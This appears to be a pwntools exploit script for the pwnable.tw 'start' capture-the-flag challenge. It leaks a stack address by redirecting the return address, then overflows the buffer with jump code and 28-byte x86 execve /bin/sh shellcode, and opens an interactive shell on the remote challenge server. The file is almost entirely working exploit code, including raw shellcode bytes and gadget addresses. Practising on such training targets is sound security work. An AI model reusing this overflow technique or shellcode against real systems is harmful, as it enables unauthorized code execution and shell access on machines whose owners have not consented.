# wetw0rk

from pwn import *

# Path to local exploit if debugging or locally testing
local_file = '/home/wetw0rk/Documents/pwnable/start/start'

def main():
    """This is the main function of the exploit code that first
    triggers a leak then exploits the application with the addr
    leaked from the leak() function. If debugging locally, this
    is where you want to modify the code.
    """

    gdb_commands = ("break *0x0804809c")

    # Uncomment to remotely exploit
    p = remote("chall.pwnable.tw", 10000)

    # Uncomment to locally exploit
    #p = process([local_file,])

    # Uncomment to debug exploit
    #p = gdb.debug(local_file, gdbscript=gdb_commands)
    
    addr = leak(p)

    exploit(p, addr)

    p.interactive()


def leak(p):
    """PoC to leak a stack address using the write() syscall after
    overwriting the return address with a pointer to it. We skip
    pushing the string onto the stack ans jump straight to the
    instruction `mov ecx, esp` effectively reading 0x14 bytes from
    the stack

    :param p: The "handle" to the process object
    :type p: pwnlib.tubes.remote.remote
    """

    log.info("Triggering leak via read() syscall")

    # Offset to return address overwrite (also shellcode storage)
    offset_buffer = b"A" * 20 #nops + shellcode

    # Trigger the leak by calling the read() syscall effectively
    # leaking the stack
    ret_addr = struct.pack('<L', 0x8048087) # mov    ecx,esp
                                            # mov    dl,0x14
                                            # mov    bl,0x1
                                            # mov    al,0x4
                                            # int    0x80
    
    exploit = offset_buffer + ret_addr

    p.read()
    
    p.send(exploit)
    
    leak_buff = p.read()

    # Capture all address leaks
    leaks = []
    for i in range(int(len(leak_buff))):
        try:
            leaks += hex( struct.unpack("<L", leak_buff[i:(i+4)])[0] ),
            i += 4
        except:
            pass

    # Stack address leak consistent at this location
    stack_addr = leaks[0]

    log.info(f"Successfully leaked stack address @{{{stack_addr}}}")
   
    return stack_addr

def exploit(p, addr):
    """Using an address leak this function will trigger the buffer
    overflow within the application and inject our shellcode. Once
    injected and execution flow is hijacked the shelcode will then
    launch a /bin/sh shell session under the context of the user.
    
    :param p: The "handle" to the process object
    :type p: pwnlib.tubes.remote.remote

    :param addr: Leaked address to the stack pointing to shellcode
    :type addr: str
    """

    # Offset to the shellcde from the leaked address
    ret_addr = int(addr, 0x10)

    log.info(f"Shellcode located @{{{hex(ret_addr)}}}")


    # Dynamically generate a buffer to achieve the return address
    # overwrite while injecting our jump code
    jumpcode = b""
    jumpcode += b'\x83\xc4\x02' # add esp, 0x04
    jumpcode += b'\xff\xe4'     # jmp esp

    filler = b"\x90" * (20 - len(jumpcode)) # Filler to achieve overwrite
    offset_buffer = filler + jumpcode # Offset to return addr overwrite

    addr = struct.pack('<L', ret_addr) # Address of our shellcode

    # Nops for reliability
    shellcode = b"\x90" * 2

    # sickle.py -p linux/x86/execve -f python3 -v shellcode
    # size: 28 bytes
    shellcode += b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89'
    shellcode += b'\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'

    exploit = offset_buffer + addr + shellcode

    p.send(exploit)

def hexdump_read(p):
    """Simple hexdump function that returns the data read from the
    process object. This operates as `p.read()`, so when called no
    need to call `p.read()` before-hand.

    :param p: The "handle" to the process object
    :type p: pwnlib.tubes.remote.remote
    """

    data = p.read()
    print(hexdump(data))

    return data

main()
